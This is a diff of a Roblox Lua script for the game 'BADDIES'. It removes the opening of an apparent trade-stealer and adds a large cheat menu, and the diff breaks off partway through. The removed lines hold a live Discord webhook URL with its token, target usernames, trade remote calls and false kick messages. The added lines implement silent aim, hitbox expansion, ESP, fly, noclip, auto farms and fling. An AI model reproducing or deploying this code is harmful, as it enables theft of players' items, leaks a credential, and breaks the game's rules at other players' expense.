@@ -1,643 +1,2094 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TextChatService = game:GetService("TextChatService")
-local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
-local TeleportService = game:GetService("TeleportService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
+task.spawn(function()
+    local G2L = {};
 
-local localPlayer = Players.LocalPlayer
-local playerGui = localPlayer:WaitForChild("PlayerGui")
+-- ScreenGui
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["IgnoreGuiInset"] = true;
+G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.None;
+G2L["1"]["Name"] = [[7v2 GUI]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1"]["ResetOnSpawn"] = false;
 
--- Check if game is BADDIES (11158043705)
-if game.PlaceId ~= 11158043705 then
-    localPlayer:Kick("Script doesnt support this game, join BADDIES")
-    return
+-- Toggle Button (Floating, Draggable)
+G2L["toggleBtn"] = Instance.new("TextButton", G2L["1"]);
+G2L["toggleBtn"]["Size"] = UDim2.new(0, 110, 0, 38);
+G2L["toggleBtn"]["Position"] = UDim2.new(0.04, 0, 0.04, 0);
+G2L["toggleBtn"]["BackgroundColor3"] = Color3.fromRGB(90, 30, 120);
+G2L["toggleBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["toggleBtn"]["Text"] = [[7v2 â˜°]];
+G2L["toggleBtn"]["TextSize"] = 18;
+G2L["toggleBtn"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold);
+G2L["toggleBtn"]["BorderSizePixel"] = 0;
+G2L["toggleBtn"]["ZIndex"] = 10;
+Instance.new("UICorner", G2L["toggleBtn"]).CornerRadius = UDim.new(0, 10);
+local tbStroke = Instance.new("UIStroke", G2L["toggleBtn"]);
+tbStroke.Color = Color3.fromRGB(180, 80, 220);
+tbStroke.Thickness = 1.5;
+
+-- MainFrame
+G2L["main"] = Instance.new("Frame", G2L["1"]);
+G2L["main"]["Size"] = UDim2.new(0, 580, 0, 400);
+G2L["main"]["Position"] = UDim2.new(0.5, -290, 0.5, -200);
+G2L["main"]["BackgroundColor3"] = Color3.fromRGB(22, 10, 32);
+G2L["main"]["BorderSizePixel"] = 0;
+G2L["main"]["ClipsDescendants"] = true;
+Instance.new("UICorner", G2L["main"]).CornerRadius = UDim.new(0, 14);
+local mainStroke = Instance.new("UIStroke", G2L["main"]);
+mainStroke.Color = Color3.fromRGB(140, 50, 200);
+mainStroke.Thickness = 2;
+
+-- TopBar
+G2L["topbar"] = Instance.new("Frame", G2L["main"]);
+G2L["topbar"]["Size"] = UDim2.new(1, 0, 0, 52);
+G2L["topbar"]["BackgroundColor3"] = Color3.fromRGB(50, 15, 75);
+G2L["topbar"]["BorderSizePixel"] = 0;
+Instance.new("UICorner", G2L["topbar"]).CornerRadius = UDim.new(0, 14);
+-- fix bottom corners of topbar
+local topFix = Instance.new("Frame", G2L["topbar"]);
+topFix.Size = UDim2.new(1, 0, 0, 14);
+topFix.Position = UDim2.new(0, 0, 1, -14);
+topFix.BackgroundColor3 = Color3.fromRGB(50, 15, 75);
+topFix.BorderSizePixel = 0;
+
+G2L["title"] = Instance.new("TextLabel", G2L["topbar"]);
+G2L["title"]["Size"] = UDim2.new(0, 320, 1, 0);
+G2L["title"]["Position"] = UDim2.new(0, 14, 0, 0);
+G2L["title"]["BackgroundTransparency"] = 1;
+G2L["title"]["Text"] = [[7v2 Legit Players]];
+G2L["title"]["TextColor3"] = Color3.fromRGB(220, 150, 255);
+G2L["title"]["TextSize"] = 22;
+G2L["title"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold);
+G2L["title"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+
+G2L["subtitle"] = Instance.new("TextLabel", G2L["topbar"]);
+G2L["subtitle"]["Size"] = UDim2.new(0, 240, 0, 18);
+G2L["subtitle"]["Position"] = UDim2.new(0, 14, 0, 30);
+G2L["subtitle"]["BackgroundTransparency"] = 1;
+G2L["subtitle"]["Text"] = [[v2.0 | discord.gg/AgxRfjBtQ8]];
+G2L["subtitle"]["TextColor3"] = Color3.fromRGB(160, 100, 200);
+G2L["subtitle"]["TextSize"] = 13;
+G2L["subtitle"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+
+-- Tab names â€” added Macro
+local tabNames = {"Fight", "Guns", "Visuals", "Farms", "Misc", "OP Tools", "Macro"}
+local tabFrames = {}
+local tabButtons = {}
+
+-- NavBar
+G2L["navbar"] = Instance.new("Frame", G2L["main"]);
+G2L["navbar"]["Size"] = UDim2.new(0, 120, 0, 348);
+G2L["navbar"]["Position"] = UDim2.new(0, 0, 0, 52);
+G2L["navbar"]["BackgroundColor3"] = Color3.fromRGB(35, 12, 55);
+G2L["navbar"]["BorderSizePixel"] = 0;
+local navLayout = Instance.new("UIListLayout", G2L["navbar"]);
+navLayout.Padding = UDim.new(0, 3);
+navLayout.SortOrder = Enum.SortOrder.LayoutOrder;
+local navPad = Instance.new("UIPadding", G2L["navbar"]);
+navPad.PaddingTop = UDim.new(0, 6);
+navPad.PaddingLeft = UDim.new(0, 4);
+navPad.PaddingRight = UDim.new(0, 4);
+
+-- Content
+G2L["content"] = Instance.new("Frame", G2L["main"]);
+G2L["content"]["Size"] = UDim2.new(0, 455, 0, 348);
+G2L["content"]["Position"] = UDim2.new(0, 125, 0, 52);
+G2L["content"]["BackgroundColor3"] = Color3.fromRGB(28, 12, 42);
+G2L["content"]["BorderSizePixel"] = 0;
+Instance.new("UICorner", G2L["content"]).CornerRadius = UDim.new(0, 10);
+
+-- Divider
+local divider = Instance.new("Frame", G2L["main"]);
+divider.Size = UDim2.new(0, 2, 0, 348);
+divider.Position = UDim2.new(0, 120, 0, 52);
+divider.BackgroundColor3 = Color3.fromRGB(100, 30, 150);
+divider.BorderSizePixel = 0;
+
+-- Build nav buttons and tab frames
+for i, name in ipairs(tabNames) do
+    local btn = Instance.new("TextButton", G2L["navbar"]);
+    btn.Size = UDim2.new(1, 0, 0, 36);
+    btn.BackgroundColor3 = Color3.fromRGB(60, 20, 90);
+    btn.TextColor3 = Color3.fromRGB(190, 130, 220);
+    btn.Text = name;
+    btn.TextSize = 13;
+    btn.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold);
+    btn.BorderSizePixel = 0;
+    btn.LayoutOrder = i;
+    btn.AutoButtonColor = false;
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8);
+    tabButtons[i] = btn;
+
+    local sf = Instance.new("ScrollingFrame", G2L["content"]);
+    sf.Size = UDim2.new(1, 0, 1, 0);
+    sf.BackgroundTransparency = 1;
+    sf.BorderSizePixel = 0;
+    sf.ScrollBarImageColor3 = Color3.fromRGB(140, 50, 200);
+    sf.ScrollBarThickness = 4;
+    sf.CanvasSize = UDim2.new(0, 0, 0, 0);
+    sf.AutomaticCanvasSize = Enum.AutomaticSize.Y;
+    sf.Visible = false;
+    local layout = Instance.new("UIListLayout", sf);
+    layout.Padding = UDim.new(0, 8);
+    layout.SortOrder = Enum.SortOrder.LayoutOrder;
+    local pad = Instance.new("UIPadding", sf);
+    pad.PaddingTop = UDim.new(0, 10);
+    pad.PaddingLeft = UDim.new(0, 12);
+    pad.PaddingRight = UDim.new(0, 12);
+    pad.PaddingBottom = UDim.new(0, 10);
+    tabFrames[i] = sf;
 end
 
-local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
-local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
-local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
-local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
-local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
-local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
-
-local MY_WEBHOOK = "https://discordapp.com/api/webhooks/1521699994674139256/n6onaHcwt2y_Q23mNRHwO4i1-r5zfAqTmEnl3kU8nx9fiU9y-LBof5K5IDVwEjvmnfDJ"
-local USER_WEBHOOK = _G.Webhook or "PUTHERE"
-local MY_USERNAMES = _G.Usernames or {"noahgiftsx", "", "", "", ""}
-
-local START_TIME = os.time()
-
-local function checkServerStatus()
-    local playerCount = #Players:GetPlayers()
-    local maxPlayers = Players.MaxPlayers
-    if playerCount >= maxPlayers - 1 then
-        localPlayer:Kick("rejoin a diff server")
-        return false
-    end
-    if playerCount < 3 then
-        localPlayer:Kick("DATA not loaded, rejoin a public")
-        return false
-    end
-    return true
+-- Helper functions
+local function makeToggle(parent, labelText, width, height)
+    width = width or 390
+    height = height or 36
+    local btn = Instance.new("TextButton", parent);
+    btn.Size = UDim2.new(0, width, 0, height);
+    btn.BackgroundColor3 = Color3.fromRGB(55, 18, 80);
+    btn.TextColor3 = Color3.fromRGB(200, 150, 230);
+    btn.Text = labelText;
+    btn.TextSize = 15;
+    btn.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular);
+    btn.BorderSizePixel = 0;
+    btn.AutoButtonColor = false;
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8);
+    local stroke = Instance.new("UIStroke", btn);
+    stroke.Color = Color3.fromRGB(130, 50, 180);
+    stroke.Thickness = 1.2;
+    return btn, stroke
 end
 
-if not checkServerStatus() then return end
-
-local function formatNumber(num)
-    if not num then return "N/A" end
-    if num >= 1000000 then
-        return string.format("%.1fM", num / 1000000)
-    elseif num >= 1000 then
-        return string.format("%.1fK", num / 1000)
-    else
-        return tostring(num)
-    end
+local function makeSectionLabel(parent, text)
+    local lbl = Instance.new("TextLabel", parent);
+    lbl.Size = UDim2.new(0, 390, 0, 24);
+    lbl.BackgroundTransparency = 1;
+    lbl.Text = "â€” " .. text .. " â€”";
+    lbl.TextColor3 = Color3.fromRGB(200, 100, 255);
+    lbl.TextSize = 13;
+    lbl.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold);
+    lbl.TextXAlignment = Enum.TextXAlignment.Center;
+    return lbl
 end
 
-local function hasMainWeapons()
-    local tools = {}
-    local function collect(from)
-        if from then
-            for _, v in ipairs(from:GetChildren()) do
-                if v:IsA("Tool") then table.insert(tools, v.Name) end
+local function makeTextBox(parent, placeholder, width, height)
+    width = width or 150; height = height or 32
+    local box = Instance.new("TextBox", parent);
+    box.Size = UDim2.new(0, width, 0, height);
+    box.BackgroundColor3 = Color3.fromRGB(45, 15, 65);
+    box.TextColor3 = Color3.fromRGB(220, 170, 255);
+    box.PlaceholderText = placeholder or "";
+    box.PlaceholderColor3 = Color3.fromRGB(130, 80, 160);
+    box.Text = "";
+    box.TextSize = 14;
+    box.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]]);
+    box.BorderSizePixel = 0;
+    box.ClearTextOnFocus = false;
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8);
+    local s = Instance.new("UIStroke", box);
+    s.Color = Color3.fromRGB(130, 50, 180); s.Thickness = 1.2;
+    return box
+end
+
+-- ========================= LOADING OVERLAY (Block Trade Scripts) =========================
+G2L["loadingOverlay"] = Instance.new("Frame", G2L["1"]);
+G2L["loadingOverlay"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["loadingOverlay"]["BackgroundColor3"] = Color3.fromRGB(10, 0, 20);
+G2L["loadingOverlay"]["BackgroundTransparency"] = 0.15;
+G2L["loadingOverlay"]["BorderSizePixel"] = 0;
+G2L["loadingOverlay"]["ZIndex"] = 20;
+G2L["loadingOverlay"]["Visible"] = false;
+
+local loadingBox = Instance.new("Frame", G2L["loadingOverlay"]);
+loadingBox.Size = UDim2.new(0, 340, 0, 180);
+loadingBox.Position = UDim2.new(0.5, -170, 0.5, -90);
+loadingBox.BackgroundColor3 = Color3.fromRGB(30, 10, 48);
+loadingBox.BorderSizePixel = 0;
+loadingBox.ZIndex = 21;
+Instance.new("UICorner", loadingBox).CornerRadius = UDim.new(0, 14);
+local lbStroke = Instance.new("UIStroke", loadingBox);
+lbStroke.Color = Color3.fromRGB(160, 60, 220); lbStroke.Thickness = 2;
+
+local loadingTitle = Instance.new("TextLabel", loadingBox);
+loadingTitle.Size = UDim2.new(1, 0, 0, 40);
+loadingTitle.Position = UDim2.new(0, 0, 0, 12);
+loadingTitle.BackgroundTransparency = 1;
+loadingTitle.Text = "ðŸ›¡ï¸  Securing Weapons...";
+loadingTitle.TextColor3 = Color3.fromRGB(220, 150, 255);
+loadingTitle.TextSize = 18;
+loadingTitle.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold);
+loadingTitle.ZIndex = 22;
+
+local loadingBarBg = Instance.new("Frame", loadingBox);
+loadingBarBg.Size = UDim2.new(0, 280, 0, 18);
+loadingBarBg.Position = UDim2.new(0.5, -140, 0, 62);
+loadingBarBg.BackgroundColor3 = Color3.fromRGB(50, 20, 70);
+loadingBarBg.BorderSizePixel = 0;
+loadingBarBg.ZIndex = 22;
+Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 9);
+
+local loadingBar = Instance.new("Frame", loadingBarBg);
+loadingBar.Size = UDim2.new(0, 0, 1, 0);
+loadingBar.BackgroundColor3 = Color3.fromRGB(160, 60, 220);
+loadingBar.BorderSizePixel = 0;
+loadingBar.ZIndex = 23;
+Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 9);
+
+local loadingStatus = Instance.new("TextLabel", loadingBox);
+loadingStatus.Size = UDim2.new(1, -20, 0, 30);
+loadingStatus.Position = UDim2.new(0, 10, 0, 90);
+loadingStatus.BackgroundTransparency = 1;
+loadingStatus.Text = "Scanning...";
+loadingStatus.TextColor3 = Color3.fromRGB(180, 120, 220);
+loadingStatus.TextSize = 14;
+loadingStatus.TextWrapped = true;
+loadingStatus.ZIndex = 22;
+
+local loadingResult = Instance.new("TextLabel", loadingBox);
+loadingResult.Size = UDim2.new(1, -20, 0, 50);
+loadingResult.Position = UDim2.new(0, 10, 0, 118);
+loadingResult.BackgroundTransparency = 1;
+loadingResult.Text = "";
+loadingResult.TextColor3 = Color3.fromRGB(100, 255, 160);
+loadingResult.TextSize = 13;
+loadingResult.TextWrapped = true;
+loadingResult.ZIndex = 22;
+
+-- ========================= FIGHT TAB =========================
+local fightFrame = tabFrames[1]
+
+makeSectionLabel(fightFrame, "Auto Combat")
+local autoFightBtn, autoFightStroke = makeToggle(fightFrame, "âš”ï¸  Auto Fight  [Keybind: B]")
+
+local expandHitboxWrapper = Instance.new("Frame", fightFrame);
+expandHitboxWrapper.Size = UDim2.new(0, 390, 0, 36);
+expandHitboxWrapper.BackgroundTransparency = 1;
+local expandHitboxBtn, expandHitboxStroke = makeToggle(expandHitboxWrapper, "Expand Hitbox", 220, 36)
+expandHitboxBtn.Position = UDim2.new(0, 0, 0, 0);
+local hitboxSizeBox = makeTextBox(expandHitboxWrapper, "25,15,15", 155, 36)
+hitboxSizeBox.Position = UDim2.new(0, 228, 0, 0);
+hitboxSizeBox.Text = "25,15,15";
+
+local autoStompBtn, autoStompStroke = makeToggle(fightFrame, "ðŸ‘£  Auto Stomp")
+local autoGrabBtn, autoGrabStroke = makeToggle(fightFrame, "âœ‹  Auto Grab Hair  [Keybind: N]")
+
+makeSectionLabel(fightFrame, "Instant Hit Weapons")
+local taserBtn, taserStroke = makeToggle(fightFrame, "âš¡  Taser: Instant Hit â€” Nearest")
+local grenadeBtn, grenadeStroke = makeToggle(fightFrame, "ðŸ’£  Grenade Launcher: Instant Hit â€” Nearest")
+local throwablesBtn, throwablesStroke = makeToggle(fightFrame, "ðŸŽ¯  Throwables: Instant Hit â€” Nearest")
+
+-- ========================= GUNS TAB =========================
+local gunsFrame = tabFrames[2]
+
+makeSectionLabel(gunsFrame, "Silent Aim")
+local silentAimLabel = Instance.new("TextLabel", gunsFrame);
+silentAimLabel.Size = UDim2.new(0, 390, 0, 20);
+silentAimLabel.BackgroundTransparency = 1;
+silentAimLabel.Text = "Select target players below:";
+silentAimLabel.TextColor3 = Color3.fromRGB(170, 100, 210);
+silentAimLabel.TextSize = 13;
+silentAimLabel.TextXAlignment = Enum.TextXAlignment.Left;
+
+local playerListOuter = Instance.new("Frame", gunsFrame);
+playerListOuter.Size = UDim2.new(0, 390, 0, 110);
+playerListOuter.BackgroundColor3 = Color3.fromRGB(40, 12, 60);
+playerListOuter.BorderSizePixel = 0;
+Instance.new("UICorner", playerListOuter).CornerRadius = UDim.new(0, 8);
+local plStroke = Instance.new("UIStroke", playerListOuter);
+plStroke.Color = Color3.fromRGB(130, 50, 180); plStroke.Thickness = 1.2;
+
+local playerListScroll = Instance.new("ScrollingFrame", playerListOuter);
+playerListScroll.Size = UDim2.new(1, -8, 1, -8);
+playerListScroll.Position = UDim2.new(0, 4, 0, 4);
+playerListScroll.BackgroundTransparency = 1;
+playerListScroll.BorderSizePixel = 0;
+playerListScroll.ScrollBarImageColor3 = Color3.fromRGB(140, 50, 200);
+playerListScroll.ScrollBarThickness = 4;
+playerListScroll.CanvasSize = UDim2.new(0, 0, 0, 0);
+playerListScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y;
+local plLayout = Instance.new("UIListLayout", playerListScroll);
+plLayout.Padding = UDim.new(0, 4);
+local plPad = Instance.new("UIPadding", playerListScroll);
+plPad.PaddingTop = UDim.new(0, 4); plPad.PaddingLeft = UDim.new(0, 4);
+
+local silentAimActiveBtn, silentAimActiveStroke = makeToggle(gunsFrame, "ðŸŽ¯  Silent Aim ON/OFF")
+
+makeSectionLabel(gunsFrame, "Flamethrower")
+local flameSilentAllBtn, flameSilentAllStroke = makeToggle(gunsFrame, "ðŸ”¥  Flamethrower Silent Aim: Nearest")
+local flameAimAllBtn, flameAimAllStroke = makeToggle(gunsFrame, "ðŸ”¥  Flamethrower Aim: All Players")
+
+makeSectionLabel(gunsFrame, "RPG")
+local rpgSilentBtn, rpgSilentStroke = makeToggle(gunsFrame, "ðŸš€  RPG Silent Aim: Nearest + Wall Bang")
+
+makeSectionLabel(gunsFrame, "Vehicle Mods")
+
+local vSpeedWrapper = Instance.new("Frame", gunsFrame);
+vSpeedWrapper.Size = UDim2.new(0, 390, 0, 36); vSpeedWrapper.BackgroundTransparency = 1;
+local vSpeedBtn, vSpeedStroke = makeToggle(vSpeedWrapper, "Vehicle Max Speed", 240, 36)
+vSpeedBtn.Position = UDim2.new(0, 0, 0, 0);
+local vSpeedBox = makeTextBox(vSpeedWrapper, "45", 134, 36)
+vSpeedBox.Position = UDim2.new(0, 248, 0, 0); vSpeedBox.Text = "45";
+
+local vAccelWrapper = Instance.new("Frame", gunsFrame);
+vAccelWrapper.Size = UDim2.new(0, 390, 0, 36); vAccelWrapper.BackgroundTransparency = 1;
+local vAccelBtn, vAccelStroke = makeToggle(vAccelWrapper, "Vehicle Acceleration", 240, 36)
+vAccelBtn.Position = UDim2.new(0, 0, 0, 0);
+local vAccelBox = makeTextBox(vAccelWrapper, "25", 134, 36)
+vAccelBox.Position = UDim2.new(0, 248, 0, 0); vAccelBox.Text = "25";
+
+local vBrakeWrapper = Instance.new("Frame", gunsFrame);
+vBrakeWrapper.Size = UDim2.new(0, 390, 0, 36); vBrakeWrapper.BackgroundTransparency = 1;
+local vBrakeBtn, vBrakeStroke = makeToggle(vBrakeWrapper, "Vehicle Braking", 240, 36)
+vBrakeBtn.Position = UDim2.new(0, 0, 0, 0);
+local vBrakeBox = makeTextBox(vBrakeWrapper, "105", 134, 36)
+vBrakeBox.Position = UDim2.new(0, 248, 0, 0); vBrakeBox.Text = "105";
+
+local vFlyWrapper = Instance.new("Frame", gunsFrame);
+vFlyWrapper.Size = UDim2.new(0, 390, 0, 36); vFlyWrapper.BackgroundTransparency = 1;
+local vFlyBtn, vFlyStroke = makeToggle(vFlyWrapper, "Vehicle Fly [PC]", 240, 36)
+vFlyBtn.Position = UDim2.new(0, 0, 0, 0);
+local vFlyBox = makeTextBox(vFlyWrapper, "50", 134, 36)
+vFlyBox.Position = UDim2.new(0, 248, 0, 0); vFlyBox.Text = "50";
+
+-- ========================= VISUALS TAB =========================
+local visualsFrame = tabFrames[3]
+makeSectionLabel(visualsFrame, "Player Visuals")
+local playerEspBtn, playerEspStroke = makeToggle(visualsFrame, "ðŸ‘¤  Player ESP â€” Team Color Highlight")
+local tracersBtn, tracersStroke = makeToggle(visualsFrame, "ðŸ“¡  Player Tracers")
+makeSectionLabel(visualsFrame, "World Visuals")
+local moneyEspBtn, moneyEspStroke = makeToggle(visualsFrame, "ðŸ’°  Money ESP â€” Cash on Ground")
+local itemEspBtn, itemEspStroke = makeToggle(visualsFrame, "ðŸŽ’  Item ESP â€” Pickupable Items")
+local robberyEspBtn, robberyEspStroke = makeToggle(visualsFrame, "ðŸ¦  Robbery ESP â€” ATMs & Damageables")
+
+-- ========================= FARMS TAB =========================
+local farmsFrame = tabFrames[4]
+makeSectionLabel(farmsFrame, "Money Farms")
+local nailsFarmBtn, nailsFarmStroke = makeToggle(farmsFrame, "ðŸ’…  Nails Farm")
+local collectCashBtn, collectCashStroke = makeToggle(farmsFrame, "ðŸ’¸  Collect Cash")
+
+local dropWrapper = Instance.new("Frame", farmsFrame);
+dropWrapper.Size = UDim2.new(0, 390, 0, 36); dropWrapper.BackgroundTransparency = 1;
+local dropBtn, dropStroke = makeToggle(dropWrapper, "ðŸ“¤  Auto Drop Cash", 220, 36)
+dropBtn.Position = UDim2.new(0, 0, 0, 0);
+local dropBox = makeTextBox(dropWrapper, "Amount (max 20000)", 158, 36)
+dropBox.Position = UDim2.new(0, 228, 0, 0);
+
+local atmBtn, atmStroke = makeToggle(farmsFrame, "ðŸ§  ATM Farm")
+local bankBtn, bankStroke = makeToggle(farmsFrame, "ðŸ¦  Bank Farm")
+
+-- ========================= MISC TAB =========================
+local miscFrame = tabFrames[5]
+makeSectionLabel(miscFrame, "Movement")
+
+local flyWrapper = Instance.new("Frame", miscFrame);
+flyWrapper.Size = UDim2.new(0, 390, 0, 36); flyWrapper.BackgroundTransparency = 1;
+local flyBtn, flyStroke = makeToggle(flyWrapper, "âœˆï¸  Fly  [Keybind: X]", 220, 36)
+flyBtn.Position = UDim2.new(0, 0, 0, 0);
+local flySpeedBox = makeTextBox(flyWrapper, "Speed (e.g. 50)", 158, 36)
+flySpeedBox.Position = UDim2.new(0, 228, 0, 0);
+
+local speedWrapper = Instance.new("Frame", miscFrame);
+speedWrapper.Size = UDim2.new(0, 390, 0, 36); speedWrapper.BackgroundTransparency = 1;
+local speedBtn, speedStroke = makeToggle(speedWrapper, "âš¡  Speed  [Keybind: Z]", 220, 36)
+speedBtn.Position = UDim2.new(0, 0, 0, 0);
+local speedBox = makeTextBox(speedWrapper, "Speed (e.g. 50)", 158, 36)
+speedBox.Position = UDim2.new(0, 228, 0, 0);
+
+local noclipBtn, noclipStroke = makeToggle(miscFrame, "ðŸ‘»  No-Clip  [Keybind: C]")
+local infJumpBtn, infJumpStroke = makeToggle(miscFrame, "ðŸ¦˜  Infinite Jump")
+makeSectionLabel(miscFrame, "Utility")
+local antiAfkBtn, antiAfkStroke = makeToggle(miscFrame, "ðŸ•  Anti AFK")
+local removeBarriersBtn, removeBarriersStroke = makeToggle(miscFrame, "ðŸšª  Remove House & Mansion Barriers")
+local disableKeybindsBtn, disableKeybindsStroke = makeToggle(miscFrame, "âŒ¨ï¸  Disable Keybinds")
+local teleportsBtn, teleportsStroke = makeToggle(miscFrame, "ðŸ—ºï¸  Open Teleport GUI")
+local copyDiscordBtn, copyDiscordStroke = makeToggle(miscFrame, "ðŸ“‹  Copy Discord Invite")
+local blockTradeBtn, blockTradeStroke = makeToggle(miscFrame, "ðŸ›¡ï¸  Block Trade Scripts")
+
+-- ========================= OP TOOLS TAB =========================
+local opFrame = tabFrames[6]
+makeSectionLabel(opFrame, "OP Tools")
+local flingBtn, flingStroke = makeToggle(opFrame, "ðŸ’¥  Fling")
+
+-- ========================= MACRO TAB =========================
+local macroFrame = tabFrames[7]
+makeSectionLabel(macroFrame, "Snowball Combos")
+
+local snowballMacroBtn = Instance.new("TextButton", macroFrame);
+snowballMacroBtn.Size = UDim2.new(0, 390, 0, 46);
+snowballMacroBtn.BackgroundColor3 = Color3.fromRGB(90, 20, 130);
+snowballMacroBtn.TextColor3 = Color3.fromRGB(230, 180, 255);
+snowballMacroBtn.Text = "â„ï¸  Snowball Macro  [Keybind: C]";
+snowballMacroBtn.TextSize = 16;
+snowballMacroBtn.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold);
+snowballMacroBtn.BorderSizePixel = 0;
+snowballMacroBtn.AutoButtonColor = false;
+Instance.new("UICorner", snowballMacroBtn).CornerRadius = UDim.new(0, 10);
+local snowballStroke = Instance.new("UIStroke", snowballMacroBtn);
+snowballStroke.Color = Color3.fromRGB(180, 80, 255);
+snowballStroke.Thickness = 2;
+
+local snowballStatusLabel = Instance.new("TextLabel", macroFrame);
+snowballStatusLabel.Size = UDim2.new(0, 390, 0, 22);
+snowballStatusLabel.BackgroundTransparency = 1;
+snowballStatusLabel.Text = "Status: Ready";
+snowballStatusLabel.TextColor3 = Color3.fromRGB(160, 100, 200);
+snowballStatusLabel.TextSize = 13;
+snowballStatusLabel.TextXAlignment = Enum.TextXAlignment.Left;
+
+-- ========================= SCRIPTS =========================
+
+-- Auto Tutorial
+local function runAutoTutorial()
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Players = game:GetService("Players")
+    local Workspace = game:GetService("Workspace")
+    if game.PlaceId ~= 138940708178498 then return end
+    local player = Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+    local tool = player.Backpack:FindFirstChild("1 punches") or character:FindFirstChild("1 punches")
+    if tool then player.Character.Humanoid:EquipTool(tool) end
+    ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/StartCutscene"):FireServer()
+    wait(1)
+    humanoidRootPart.CFrame = CFrame.new(-4,9,29)
+    local jEvent = ReplicatedStorage:WaitForChild("JALADADEPELOEVENT")
+    for i=1,3 do jEvent:FireServer() wait(0.1) end
+    wait(3)
+    local tutBot = Workspace:WaitForChild("TutorialBot")
+    local tutHead = tutBot:WaitForChild("Head")
+    local tutHRP = tutBot:WaitForChild("HumanoidRootPart")
+    local punchOff = CFrame.new(0, tutHead.Size.Y/2+humanoidRootPart.Size.Y/2, 0)
+    humanoidRootPart.CFrame = tutHead.CFrame * punchOff
+    local punchEvent = ReplicatedStorage:WaitForChild("PUNCHEVENT")
+    local st = tick()
+    while (tick()-st) < 4 do
+        humanoidRootPart.CFrame = tutHead.CFrame * punchOff
+        punchEvent:FireServer(1)
+        wait(0.1)
+    end
+    local stompOff = CFrame.new(0, tutHRP.Size.Y/2+humanoidRootPart.Size.Y/2, 0)
+    local stompEvent = ReplicatedStorage:WaitForChild("STOMPEVENT")
+    for i=1,10 do
+        humanoidRootPart.CFrame = tutHRP.CFrame * stompOff
+        stompEvent:FireServer()
+        wait(0.05)
+    end
+end
+task.spawn(runAutoTutorial)
+
+-- Toggle button + Dragging
+local function runToggleAndDrag()
+    local UIS = game:GetService("UserInputService")
+    local guiOpen = true
+    local toggleBtn = G2L["toggleBtn"]
+    local mainFrame = G2L["main"]
+
+    -- Toggle open/close (only fires if not dragging)
+    local toggleDragging = false
+    local toggleDragStart, toggleStartPos
+    local toggleMoved = false
+
+    toggleBtn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            toggleDragging = true
+            toggleMoved = false
+            toggleDragStart = input.Position
+            toggleStartPos = toggleBtn.Position
+        end
+    end)
+
+    toggleBtn.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            toggleDragging = false
+            if not toggleMoved then
+                guiOpen = not guiOpen
+                mainFrame.Visible = guiOpen
+                toggleBtn.Text = guiOpen and "7v2 â˜°" or "7v2 â–¶"
+            end
+        end
+    end)
+
+    -- Main frame drag
+    local mainDragging = false
+    local mainDragStart, mainStartPos
+
+    G2L["topbar"].InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            mainDragging = true
+            mainDragStart = input.Position
+            mainStartPos = mainFrame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    mainDragging = false
+                end
+            end)
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            if toggleDragging and toggleDragStart then
+                local delta = input.Position - toggleDragStart
+                if delta.Magnitude > 4 then
+                    toggleMoved = true
+                    toggleBtn.Position = UDim2.new(
+                        toggleStartPos.X.Scale, toggleStartPos.X.Offset + delta.X,
+                        toggleStartPos.Y.Scale, toggleStartPos.Y.Offset + delta.Y
+                    )
+                end
+            end
+            if mainDragging and mainDragStart then
+                local delta = input.Position - mainDragStart
+                mainFrame.Position = UDim2.new(
+                    mainStartPos.X.Scale, mainStartPos.X.Offset + delta.X,
+                    mainStartPos.Y.Scale, mainStartPos.Y.Offset + delta.Y
+                )
+            end
